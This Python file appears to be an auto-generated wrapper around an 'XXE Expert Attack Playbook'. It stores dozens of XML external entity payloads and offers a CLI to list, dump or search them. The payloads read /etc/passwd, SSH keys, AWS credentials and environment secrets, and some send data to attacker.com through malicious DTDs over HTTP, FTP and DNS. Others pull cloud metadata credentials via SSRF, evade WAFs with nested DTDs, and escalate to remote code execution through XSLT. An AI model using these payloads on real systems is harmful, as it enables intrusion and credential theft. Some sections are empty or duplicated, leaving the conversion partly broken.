#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/xxe-xml-external-entity

Skill: SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-xxe-xml-external-entity.py --help
      python hack-skills-xxe-xml-external-entity.py --list
      python hack-skills-xxe-xml-external-entity.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/xxe-xml-external-entity'
TITLE = 'SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: xxe-xml-external-entity", "description: >-", "XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources."],
    'skill-xml-external-entity-injection-xxe-expert-attack-playbook': [],
    '0-related-routing': ["Also load:", "- [upload insecure files](../upload-insecure-files/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines"],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- Apache Solr XXE + RCE chain (CVE-2017-12629) \u2014 XXE to read config, then VelocityResponseWriter for RCE", "- Office docx XXE step-by-step \u2014 unzip \u2192 inject DOCTYPE into `word/document.xml` or `[Content_Types].xml` \u2192 repackage \u2192 upload", "- DOCTYPE-based blind SSRF \u2014 `PUBLIC` external DTD reference triggers HTTP callback without entity reflection", "- PHP `expect://` protocol via XXE \u2014 direct command execution when expect extension is installed", "- Blind XXE via error messages \u2014 force file path error that leaks content in exception text", "- XXE in SOAP web services \u2014 inject entities into SOAP Envelope/Body elements"],
    '1-classic-xxe-payload': ["```xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "<!DOCTYPE foo [", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<root><data>&xxe;</data></root>", "If `/etc/passwd` reflects in response \u2192 confirmed file read."],
    '2-attack-surface-discovery': [],
    'direct-xml-inputs': ["- SOAP endpoints (`text/xml`, `application/soap+xml`)", "- REST APIs accepting `application/xml`", "- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)", "- SVG uploads (SVG is XML)", "- RSS/Atom feed parsers", "- Web services with XML config import"],
    'non-obvious-xml-processing': ["Change `Content-Type` header on **any** JSON POST to:", "Content-Type: application/xml", "Then rewrite body as XML \u2014 many backends use dual-format parsers or auto-detect."],
    'pdf-generators': ["Some HTML\u2192PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML."],
    '3-oob-out-of-band-xxe-critical': ["Use when direct entity reflection fails (server parses but doesn't echo entity content):"],
    'step-1-blind-detection': ["```xml", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://BURP_COLLABORATOR/\">]>", "<root>&xxe;</root>", "DNS/HTTP hit to collaborator \u2192 confirms XXE (even if no file content returned)."],
    'step-2-oob-file-exfiltration-via-attacker-hosted-dtd': ["**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:", "```xml", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % exfil \"<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">", "%exfil;", "**Payload sent to target**:", "```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [", "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">", "%dtd;", "<root>&exfiltrate;</root>", "File contents appear in attacker's HTTP server request log."],
    'step-3-error-based-oob-alternative-when-http-blocked': ["Use intentional error to leak data in error message:", "```xml", "<!-- attacker.com/error.dtd -->", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % eval \"<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>\">", "%eval;", "%error;"],
    '4-xxe-file-read-targets': ["**Linux**:", "/etc/passwd", "/etc/shadow  (requires root)", "/etc/hosts", "/proc/self/environ      \u2190 environment variables (DB creds, API keys)", "/proc/self/cmdline      \u2190 process command line", "/var/log/apache2/access.log  \u2190 may contain passwords in URLs", "/home/USER/.ssh/id_rsa  \u2190 SSH private key", "/home/USER/.aws/credentials \u2190 AWS keys", "/home/USER/.bash_history", "**Windows**:", "C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\inetpub\\wwwroot\\web.config    \u2190 ASP.NET connection strings", "C:\\xampp\\htdocs\\wp-config.php    \u2190 WordPress DB credentials", "C:\\Users\\Administrator\\.ssh\\id_rsa"],
    '5-svg-xxe-file-upload-context': ["When SVG uploads are accepted and served/processed:", "```xml", "<?xml version=\"1.0\" standalone=\"yes\"?>", "<!DOCTYPE svg [", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"500\" height=\"100\">", "<text font-size=\"16\">&xxe;</text>", "</svg>", "Upload as `.svg` \u2192 `GET /uploads/file.svg` \u2192 file contents in response."],
    '6-office-file-xxe-docx-xlsx-pptx': ["Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:", "```bash"],
    'step-1-extract': ["unzip original.docx -d extracted/"],
    'step-2-edit-word-document-xml-add-malicious-dtd': [],
    'add-after-xml-version-1-0-encoding-utf-8-standalone-yes': [],
    'doctype-foo-entity-xxe-system-file-etc-passwd': [],
    'then-use-xxe-inside-document-text': [],
    'step-3-repackage': ["cd extracted && zip -r ../malicious.docx ."],
    '7-soap-endpoint-xxe': ["SOAP requests parse XML by definition. Inject external entity into SOAP envelope:", "```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">", "<soap:Body>", "<getUser>", "<id>&xxe;</id>", "</getUser>", "</soap:Body>", "</soap:Envelope>"],
    '8-xxe-ssrf-chain': ["XXE external entity can point to internal HTTP endpoints (identical to SSRF):", "```xml", "<!DOCTYPE foo [", "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">", "<root>&xxe;</root>", "This combines XXE file read + SSRF into a single payload."],
    '9-xinclude-attack': ["When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:", "```xml", "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">", "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>", "</foo>", "Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled."],
    '10-protocol-handlers-in-xxe': ["```xml", "<!-- HTTP (SSRF) -->", "<!ENTITY xxe SYSTEM \"http://internal.company.com/admin/\">", "<!-- File read -->", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<!-- PHP wrapper (if PHP with libxml2) -->", "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">", "<!-- Decode base64 in response to get file contents -->", "<!-- FTP (exfil / port scan) -->", "<!ENTITY xxe SYSTEM \"ftp://attacker.com:21/x\">", "<!-- Gopher (Redis, SMTP) -->", "<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/info%0d%0a\">"],
    '11-bypassing-defenses': [],
    'parser-blocks-doctype': ["Try XInclude (no DOCTYPE needed, see \u00a79)."],
    'only-allows-specific-xml-schemas': ["If schema validation occurs: inject comments or CDATA after schema validation but before entity processing."],
    'response-encoding-issues-binary-in-response': ["Use PHP filter for base64:", "```xml", "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">"],
    'network-restrictions-on-oob': ["Use DNS-only OOB via `SYSTEM \"file://HASH.attacker.com\"` \u2014 no HTTP required, DNS lookup leaks data."],
    '12-quick-detection-checklist': ["\u25a1 Find XML input point (or JSON\u2192XML transformation)", "\u25a1 Send basic entity: <!ENTITY xxe \"test\"> \u2192 &xxe; in body \u2192 does \"test\" reflect?", "\u25a1 If yes \u2192 file read: SYSTEM \"file:///etc/passwd\"", "\u25a1 If no reflection \u2192 OOB test via Collaborator URL", "\u25a1 If OOB hit \u2192 set up attacker DTD for file exfiltration", "\u25a1 Try SVG upload with XXE", "\u25a1 Try Content-Type: application/xml on JSON endpoints", "\u25a1 Try XInclude if DOCTYPE-based fails"],
    '13-local-dtd-injection-blind-xxe-amplification': ["When external entities are blocked but local DTD files exist on the server:"],
    'technique': ["```xml", "<!-- Override an entity defined in a LOCAL DTD file -->", "<!DOCTYPE foo [", "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">", "<!ENTITY % ISOamso '", "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">", "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">", "&#x25;eval;", "&#x25;error;", "%local_dtd;"],
    'common-local-dtd-paths': [],
    'linux': ["/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help", "/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig", "/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd", "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd", "/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd", "/usr/share/struts/struts-config_1_0.dtd     # Apache Struts", "/usr/share/nmap/nmap.dtd                    # Nmap", "/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP"],
    'windows': ["C:\\Windows\\System32\\wbem\\xml\\cim20.dtd            # WMI", "C:\\Windows\\System32\\wbem\\xml\\wmi20.dtd             # WMI", "C:\\Program Files\\IBM\\WebSphere\\*.dtd               # WebSphere", "C:\\Program Files (x86)\\Lotus\\*.dtd                 # Lotus Notes"],
    'inside-jar-files-java-applications': ["jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd", "jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd", "file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd"],
    'why-this-works': ["- External connections blocked (firewall/WAF/egress filter)", "- But file:// to LOCAL files is usually allowed", "- Local DTD is trusted \u2192 entity overrides inject attacker-controlled definitions", "- Error messages or blind extraction via file:// still works"],
    '14-additional-oob-exfiltration-channels': [],
    'ftp-based-exfiltration-line-by-line': ["FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:", "```xml", "<!-- attacker.com/ftp-exfil.dtd -->", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % exfil \"<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>\">", "%exfil;", "%send;", "Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 \u2014 each line of the file arrives as a separate `RETR` or `CWD` command."],
    'http-parameter-exfiltration': ["```xml", "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">", "<!ENTITY % exfil \"<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>\">", "%exfil;", "%send;", "Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server."],
    '15-dtd-nesting-tricks-parameter-entity-chaining': [],
    'parameter-entity-within-parameter-entity': ["Used to bypass parsers that block direct entity references in entity values:", "```xml", "<!DOCTYPE foo [", "<!ENTITY % a \"&#x25; b;\">", "<!ENTITY % b SYSTEM \"http://attacker.com/chain.dtd\">", "The parser expands `%a;` \u2192 `%b;` \u2192 fetches external DTD. Some WAFs only inspect the first level of entity definitions."],
    'triple-nested-for-filter-evasion': ["```xml", "<!-- attacker.com/stage1.dtd -->", "<!ENTITY % s2 SYSTEM \"http://attacker.com/stage2.dtd\">", "<!-- attacker.com/stage2.dtd -->", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % s3 \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">", "%exfil;", "Payload sent to target only references `stage1.dtd` \u2014 the actual file read happens two DTD fetches deep, evading shallow WAF inspection."],
    '16-xxe-in-non-obvious-formats': [],
    'saml-xxe': ["```xml", "<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">", "<saml:Assertion>", "<saml:Subject>", "<saml:NameID>&xxe;</saml:NameID>", "</saml:Subject>", "</saml:Assertion>", "</samlp:Response>", "Re-encode to base64, submit as `SAMLResponse` parameter."],
    '17-xxe-via-file-upload': [],
    'svg-upload': ["```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"500\" height=\"500\">", "<text x=\"10\" y=\"50\" font-size=\"14\">&xxe;</text>", "</svg>", "Upload as avatar/image \u2192 view uploaded SVG \u2192 file content rendered as text."],
    'xlsx-excel-upload': ["```bash"],
    '1-create-minimal-xlsx-unzip-it': ["unzip report.xlsx -d xlsx_tmp/"],
    '2-inject-into-xl-sharedstrings-xml': [],
    'add-after-xml-declaration': [],
    'doctype-foo-entity-xxe-system-file-etc-passwd': [],
    'replace-a-t-element-content-with-xxe': [],
    '3-repackage': ["cd xlsx_tmp && zip -r ../malicious.xlsx .", "Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors)."],
    'docx-upload': ["```bash"],
    'target-word-document-xml': [],
    'same-approach-unzip-inject-doctype-entity-repackage': [],
    'alternative-inject-into-customxml-item1-xml-if-custom-xml-parts-exist': [],
    'processing-pipeline-attack': ["Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration."],
    '18-error-based-xxe': ["Force the XML parser to generate an error message containing file content:"],
    'method-1-non-existent-file-reference': ["```xml", "<!-- attacker.com/error.dtd -->", "<!ENTITY % file SYSTEM \"file:///etc/hostname\">", "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">", "%eval;", "%error;", "The parser attempts to open `file:///nonexistent/<hostname_content>` \u2192 error message includes the hostname value."],
    'method-2-xml-schema-validation-error': ["```xml", "<!DOCTYPE foo [", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>\">", "%eval;", "%err;", "The `jar:` protocol handler generates verbose error messages that include the expanded entity value."],
    'method-3-integer-overflow-type-error': ["```xml", "<!ENTITY % file SYSTEM \"file:///etc/passwd\">", "<!ENTITY % int \"<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>\">", "%int;", "%trick;", "Parser tries to open a file path containing the target file content \u2192 error message reveals content."],
    '19-xslt-injection-connection-to-xxe': ["XSLT processors parse XML and can be chained with XXE:"],
    'xslt-file-read': ["```xml", "<?xml version=\"1.0\"?>", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">", "<xsl:template match=\"/\">", "<xsl:value-of select=\"document('file:///etc/passwd')\"/>", "</xsl:template>", "</xsl:stylesheet>"],
    'xslt-rce-processor-dependent': ["```xml", "<!-- Xalan-J (Java) -->", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\">", "<xsl:template match=\"/\">", "<xsl:variable name=\"rtObj\" select=\"rt:getRuntime()\"/>", "<xsl:variable name=\"process\" select=\"rt:exec($rtObj,'id')\"/>", "</xsl:template>", "</xsl:stylesheet>", "<!-- PHP (libxslt with registerPHPFunctions) -->", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:php=\"http://php.net/xsl\">", "<xsl:template match=\"/\">", "<xsl:value-of select=\"php:function('system','id')\"/>", "</xsl:template>", "</xsl:stylesheet>"],
    'xxe-xslt-chain': ["If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()